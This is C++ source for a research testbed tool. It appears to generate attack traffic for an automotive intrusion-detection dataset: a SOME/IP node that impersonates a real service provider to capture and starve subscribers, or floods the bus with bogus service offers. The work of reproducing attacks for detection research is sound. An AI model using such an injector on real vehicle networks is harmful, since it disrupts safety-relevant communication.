/**
 * @file      injector_ecu.cpp
 * @author    Guilherme Frick (frickoliveira.ee@gmail.com)
 * @brief     Injector of adversarial scenarios: an ECU on the live bus that reproduces, through the
 *            real SOME/IP stack, what the attacker nodes of the reference dataset do on the wire.
 * @version   1.0
 * @date      2026-11-02
 * @copyright Copyright (c) 2026
 *
 * @details   WHY A LIVE NODE. The earlier post-capture injection pasted bursts into a PCAP, and
 *            the reference dataset turned out to contain something else: Service Discovery attacks
 *            made by vsomeip applications, in which the VICTIMS subscribe to the attacker and open
 *            the TCP connection to it (tools/attack_flows.py). That only happens on a live bus, so
 *            the scenario has to run on one. This node does only what an ECU on the same Ethernet
 *            can do by following the protocol; nothing the stack would not allow.
 *
 * @details   SCENARIOS, each one the signature measured in the dataset:
 *            - @c dos: impersonate the provider named by @c INJ_IMPERSONATE (the VDE, node_10). The
 *              same services, instances, events and eventgroups, read from the matrix; the vsomeip
 *              configuration from tools/gen_injector_config.py gives it another address and offers
 *              every 20 ms. Victims that find it first subscribe to it and open TCP to it; it then
 *              publishes ONE event (@c INJ_PUBLISH_EVENT, 0x0001 in the dataset) with ONE constant
 *              payload (@c INJ_PAYLOAD_HEX) every @c INJ_PERIOD_MS, and nothing on the others, so
 *              the victims of the other eventgroups are captured and starved. The attack only
 *              captures victims when this node is up BEFORE the real provider: platform/dup-offer.
 *            - @c fuzzy: offer @c INJ_FUZZ_COUNT services from @c INJ_FUZZ_FIRST, instance equal to
 *              the service identifier, publishing nothing. Nobody on the bus looks for them.
 *
 * @details   What this node does NOT do yet, and why: the two man-in-the-middle scenarios also send
 *            a StopOfferService in the name of the real provider, with a forged source address in
 *            the multi-node one. That frame does not come out of the vsomeip API; it needs a raw
 *            Service Discovery emitter, which is the next step of phase A (docs/PLANO.md).
 *
 * @details   Environment:
 *            - @c INJ_SCENARIO          @c dos or @c fuzzy; required.
 *            - @c INJ_APP               vsomeip application name; must match the configuration. Default @c injector.
 *            - @c INJ_IMPERSONATE       dos: matrix node to impersonate. Default @c node_10.
 *            - @c INJ_PUBLISH_EVENT     dos: the one event to publish. Default 0x0001.
 *            - @c INJ_PERIOD_MS         dos: publishing period. Default 21 (46.8 per second in the dataset).
 *            - @c INJ_PAYLOAD_HEX       dos: the constant payload. Default: the one in the dataset.
 *            - @c INJ_DECLARE           dos: @c published (default) declares only the published event;
 *                                       @c all declares every event of the impersonated provider.
 *            - @c INJ_FUZZ_FIRST        fuzzy: first service. Default 0x2001.
 *            - @c INJ_FUZZ_COUNT        fuzzy: how many services. Default 200.
 *            - @c INJ_RUN_SECONDS       stop by itself after this long; zero waits for a signal.
 *            - @c INJ_READY_TIMEOUT_MS  wait for the routing manager. Default 10000.
 *            - @c INJ_REPORT_SECONDS    period of the counters line; default 5, zero silences it.
 */
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <memory>
#include <string>
#include <thread>
#include <vector>

#include "src/libecu/NodeRuntime.hpp"
#include "src/nodes/MatrixPlan.hpp"

namespace
{

/// Set by the signal handler so the loop can leave cleanly.
std::atomic<bool> g_stop(false);

/**
 * @brief Handler for SIGINT and SIGTERM.
 * @param[in] signalNumber Signal received; not used.
 * @return None.
 */
void OnSignal(int signalNumber)
{
    static_cast<void>(signalNumber);
    g_stop.store(true);
}

constexpr std::uint32_t             kDefaultReadyMs  = 10000U;  ///< Default wait for the routing manager.
constexpr std::uint32_t             kDefaultReportS  = 5U;      ///< Default period of the counters line.
constexpr std::uint32_t             kDefaultPeriodMs = 21U;     ///< 46.8 notifications per second, measured on the .11.
constexpr std::chrono::milliseconds kIdleStep{100};             ///< Longest sleep with nothing due.

/// The constant payload the dataset attacker publishes (tools/attacker_payload.py): 24 bytes, all 69 393 notifications.
const char *const kDatasetPayloadHex = "2f1a16d52afcf4d9becd0bc30b01e17bb222ab1d9f852e72";

/**
 * @brief Read an environment variable as text.
 * @param[in] name     Variable to read.
 * @param[in] fallback Value to use when it is unset or empty.
 * @return The value, or @p fallback.
 */
std::string Env(const char *name, const char *fallback)
{
    const char *const v = std::getenv(name);
    return ((v != nullptr) && (v[0] != '\0')) ? std::string(v) : std::string(fallback);
}

/**
 * @brief Read an environment variable as an unsigned number, decimal or 0x-prefixed hexadecimal.
 * @param[in] name     Variable to read.
 * @param[in] fallback Value to use when it is unset, empty or not a number.
 * @return The value, or @p fallback.
 */
std::uint32_t EnvNumber(const char *name, std::uint32_t fallback)
{
    const std::string text = Env(name, "");
    if (text.empty())
    {
        return fallback;
    }
    else
    {
        /* Something was set: try to read it. */
    }
    char *end             = nullptr;
    const unsigned long v = std::strtoul(text.c_str(), &end, 0);
    return ((end != nullptr) && (*end == '\0')) ? static_cast<std::uint32_t>(v) : fallback;
}

/**
 * @brief Decode a hexadecimal string.
 * @param[in]  text  Even number of hexadecimal digits.
 * @param[out] bytes Decoded bytes.
 * @return Whether the text was valid.
 */
bool DecodeHex(const std::string &text, std::vector<std::uint8_t> &bytes)
{
    bytes.clear();
    if ((text.size() % 2U) != 0U)
    {
        return false;
    }
    else
    {
        /* Even length. */
    }
    for (std::size_t i = 0U; i < text.size(); i += 2U)
    {
        char *end              = nullptr;
        const std::string par  = text.substr(i, 2U);
        const unsigned long v  = std::strtoul(par.c_str(), &end, 16);
        if ((end == nullptr) || (*end != '\0'))
        {
            return false;
        }
        else
        {
            bytes.push_back(static_cast<std::uint8_t>(v));
        }
    }
    return true;
}

} // namespace

int main()
{
    static_cast<void>(std::setvbuf(stdout, nullptr, _IOLBF, 0));

    const std::string cenario = Env("INJ_SCENARIO", "");
    if ((cenario != "dos") && (cenario != "fuzzy"))
    {
        std::printf("[injector] ERRO: INJ_SCENARIO deve ser dos ou fuzzy (veio \"%s\")\n", cenario.c_str());
        return 2;
    }
    else
    {
        /* A known scenario. */
    }

    const std::string   app        = Env("INJ_APP", "injector");
    const std::uint32_t runSegs    = EnvNumber("INJ_RUN_SECONDS", 0U);
    const std::uint32_t prontoMs   = EnvNumber("INJ_READY_TIMEOUT_MS", kDefaultReadyMs);
    const std::uint32_t reportSegs = EnvNumber("INJ_REPORT_SECONDS", kDefaultReportS);

    /* ---- what to declare, decided before the stack exists ---- */

    ids::nodes::NodePlan       plano;
    std::vector<std::uint8_t>  payload;
    ids::ecu::EventId          eventoAlvo = 0U;
    ids::nodes::EventPlan      publicado;
    bool                       achouEvento = false;
    std::uint32_t              periodoMs   = 0U;
    const std::uint32_t        fuzzPrimeiro = EnvNumber("INJ_FUZZ_FIRST", 0x2001U);
    const std::uint32_t        fuzzQuantos  = EnvNumber("INJ_FUZZ_COUNT", 200U);

    if (cenario == "dos")
    {
        const std::string alvo = Env("INJ_IMPERSONATE", "node_10");
        plano                  = ids::nodes::PlanFor(alvo.c_str());
        if ((plano.node == nullptr) || (!plano.problem.empty()) || (plano.node->provideCount == 0U))
        {
            std::printf("[injector] ERRO: %s não é um provedor usável da matriz (%s)\n", alvo.c_str(), plano.problem.c_str());
            return 2;
        }
        else
        {
            /* A provider to impersonate. */
        }
        if (!DecodeHex(Env("INJ_PAYLOAD_HEX", kDatasetPayloadHex), payload))
        {
            std::printf("[injector] ERRO: INJ_PAYLOAD_HEX não é hexadecimal válido\n");
            return 2;
        }
        else
        {
            /* Payload decoded. */
        }
        eventoAlvo = static_cast<ids::ecu::EventId>(EnvNumber("INJ_PUBLISH_EVENT", 0x0001U));
        periodoMs  = EnvNumber("INJ_PERIOD_MS", kDefaultPeriodMs);
        for (std::size_t i = 0U; i < plano.publishes.size(); ++i)
        {
            if (plano.publishes[i].notifier == eventoAlvo)
            {
                publicado   = plano.publishes[i];
                achouEvento = true;
            }
            else
            {
                /* Declared, never published. */
            }
        }
        if (!achouEvento)
        {
            std::printf("[injector] ERRO: %s não publica o evento 0x%04X\n", alvo.c_str(), static_cast<unsigned>(eventoAlvo));
            return 2;
        }
        else
        {
            std::printf("[injector] dos: personifica %s (%s), publica só 0x%04X com %zu B constantes a cada %u ms\n", alvo.c_str(),
                        plano.node->appName, static_cast<unsigned>(eventoAlvo), payload.size(), static_cast<unsigned>(periodoMs));
        }
    }
    else
    {
        std::printf("[injector] fuzzy: oferece %u serviço(s) a partir de 0x%04X, sem publicar\n", static_cast<unsigned>(fuzzQuantos),
                    static_cast<unsigned>(fuzzPrimeiro));
    }

    ara::core::Result<std::unique_ptr<ids::ecu::NodeRuntime>> criado = ids::ecu::NodeRuntime::Create(app);
    if (!criado.HasValue())
    {
        std::printf("[injector] ERRO criando o runtime: %s\n", criado.Error().Message());
        return 1;
    }
    else
    {
        /* Application created. */
    }
    ids::ecu::NodeRuntime &runtime = *criado.Value();

    /* Depois do Create(), pelo mesmo motivo do generic_ecu: o init() do vsomeip
     * sobrescreve um handler instalado antes. */
    std::signal(SIGINT, OnSignal);
    std::signal(SIGTERM, OnSignal);

    /* ---- declaração ---- */

    if (cenario == "dos")
    {
        for (std::size_t i = 0U; i < plano.node->provideCount; ++i)
        {
            const ids::matrix::table::ServiceDesc *const svc = ids::matrix::table::FindService(plano.node->provides[i]);
            const ara::core::Result<void>                r   = runtime.ProvideService(svc->id, svc->instance);
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando %s: %s\n", plano.node->provides[i], r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
        /* Por padrão, SÓ o evento publicado. No dataset o .11 confirma a assinatura da
         * ADAS (52 177 Ack, eventgroup do evento 0x0001) e RECUSA as de CLU, PT e TEL
         * (~9 700 Nack cada, eventgroups 2, 3 e 4), que ficam reconectando. Declarar os
         * quatro eventos faz o injetor aceitar todo mundo, que não é o que o PCAP mostra.
         * INJ_DECLARE=all fica para comparação. */
        const bool declaraTodos = (Env("INJ_DECLARE", "published") == "all");
        for (std::size_t i = 0U; i < plano.publishes.size(); ++i)
        {
            const ids::nodes::EventPlan &ep = plano.publishes[i];
            if ((!declaraTodos) && (ep.notifier != eventoAlvo))
            {
                continue;
            }
            else
            {
                /* Declared. */
            }
            const ara::core::Result<void> r =
                runtime.ProvideEvent(ep.service, ep.instance, ep.notifier, ids::ecu::EventgroupIds(ep.eventgroups.data(), ep.eventgroups.size()),
                                     ep.isField, std::chrono::milliseconds::zero(), ep.transport);
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando evento 0x%04X: %s\n", static_cast<unsigned>(ep.notifier), r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
    }
    else
    {
        for (std::uint32_t i = 0U; i < fuzzQuantos; ++i)
        {
            const ids::ecu::ServiceId     svc = static_cast<ids::ecu::ServiceId>(fuzzPrimeiro + i);
            const ara::core::Result<void> r   = runtime.ProvideService(svc, static_cast<ids::ecu::InstanceId>(svc));
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando 0x%04X: %s\n", static_cast<unsigned>(svc), r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
    }

    /* ---- subida ---- */

    const ara::core::Result<void> iniciado = runtime.Start();
    if (!iniciado.HasValue())
    {
        std::printf("[injector] ERRO subindo a pilha: %s\n", iniciado.Error().Message());
        return 1;
    }
    else
    {
        /* Stack coming up. */
    }
    const ara::core::Result<void> registrado = runtime.WaitUntilRegistered(std::chrono::milliseconds(prontoMs));
    if (!registrado.HasValue())
    {
        std::printf("[injector] ERRO: %s\n", registrado.Error().Message());
        return 1;
    }
    else
    {
        std::printf("[injector] registrado no routing manager\n");
    }
    const ara::core::Result<void> ofertado = runtime.Offer();
    if (!ofertado.HasValue())
    {
        std::printf("[injector] ERRO ofertando: %s\n", ofertado.Error().Message());
        return 1;
    }
    else
    {
        std::printf("[injector] ofertas no ar\n");
    }

    /* ---- laço ---- */

    const std::chrono::steady_clock::time_point inicio        = std::chrono::steady_clock::now();
    std::chrono::steady_clock::time_point       proximoEnvio  = inicio;
    std::chrono::steady_clock::time_point       proximoReport = inicio + std::chrono::seconds(reportSegs);
    std::uint64_t                               enviados      = 0U;
    std::uint64_t                               falhas        = 0U;

    while (!g_stop.load())
    {
        if (!runtime.IsRegistered())
        {
            std::printf("[injector] a pilha saiu do ar; encerrando\n");
            break;
        }
        else
        {
            /* Still registered. */
        }
        const std::chrono::steady_clock::time_point agora = std::chrono::steady_clock::now();
        if ((runSegs > 0U) && (agora >= (inicio + std::chrono::seconds(runSegs))))
        {
            break;
        }
        else
        {
            /* Keep running. */
        }

        std::chrono::steady_clock::time_point acorda = agora + kIdleStep;
        if (cenario == "dos")
        {
            if (agora >= proximoEnvio)
            {
                const ara::core::Result<void> r = runtime.Send(publicado.service, publicado.instance, publicado.notifier,
                                                               ids::ecu::ByteView(payload.data(), payload.size()));
                if (r.HasValue())
                {
                    ++enviados;
                }
                else
                {
                    ++falhas;
                }
                /* Avança a partir do previsto, não de agora, para a taxa média não escorregar. */
                proximoEnvio += std::chrono::milliseconds(periodoMs);
                if (proximoEnvio < agora)
                {
                    proximoEnvio = agora + std::chrono::milliseconds(periodoMs);
                }
                else
                {
                    /* On schedule. */
                }
            }
            else
            {
                /* Not due yet. */
            }
            if (proximoEnvio < acorda)
            {
                acorda = proximoEnvio;
            }
            else
            {
                /* The idle step comes first. */
            }
        }
        else
        {
            /* Fuzzy only offers; the stack repeats the offers by itself. */
        }

        if ((reportSegs > 0U) && (agora >= proximoReport))
        {
            std::printf("[injector] %s: %llu enviados, %llu falhas\n", cenario.c_str(), static_cast<unsigned long long>(enviados),
                        static_cast<unsigned long long>(falhas));
            proximoReport = agora + std::chrono::seconds(reportSegs);
        }
        else
        {
            /* Not time to report. */
        }
        std::this_thread::sleep_until(acorda);
    }

    runtime.StopOffer();
    std::printf("[injector] encerrando, %llu enviados, %llu falhas\n", static_cast<unsigned long long>(enviados),
                static_cast<unsigned long long>(falhas));
    return 0;
}
